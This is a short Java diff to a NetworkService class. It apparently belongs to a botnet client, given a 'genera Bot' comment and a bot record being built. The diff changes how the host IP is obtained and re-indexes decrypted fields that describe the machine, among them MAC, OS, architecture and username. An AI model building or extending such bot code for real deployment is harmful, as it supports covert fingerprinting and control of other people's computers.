@@ -94,20 +94,20 @@ public class NetworkService {
 			BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, IOException {
 		ArrayList<String> netPar = new ArrayList<String>();
 		netPar = cryptoUtils.decodeStringsFromFile("");
-		this.ip = new IP(netPar.get(0));
+		this.ip = new IP(getMyIpCheckInternet());
 		System.out.println("My IP: " + ip);
-		this.mac = netPar.get(1);
+		this.mac = netPar.get(0);
 		System.out.println("My MAC: " + mac);
-		this.os = netPar.get(2);
+		this.os = netPar.get(1);
 		System.out.println("My OS: " + os);
-		this.milli = Long.parseLong(netPar.get(3));
-		this.versionOS = netPar.get(4);
+		this.milli = Long.parseLong(netPar.get(2));
+		this.versionOS = netPar.get(3);
 		System.out.println("My ver: " + versionOS);
-		this.archOS = netPar.get(5);
+		this.archOS = netPar.get(4);
 		System.out.println("My arch: " + archOS);
-		this.usernameOS = netPar.get(6);
+		this.usernameOS = netPar.get(5);
 		System.out.println("My user: " + usernameOS);
-		this.idHash = netPar.get(7);
+		this.idHash = netPar.get(6);
 		System.out.println("My IdHash: " + idHash);
 
 		String os1 = System.getProperty("os.name");
@@ -233,7 +233,6 @@ public class NetworkService {
 
 		// genera Bot
 		ArrayList<Object> data = new ArrayList<Object>();
-		data.add(ip);
 		data.add(mac);
 		data.add(os);
 		data.add(milli);
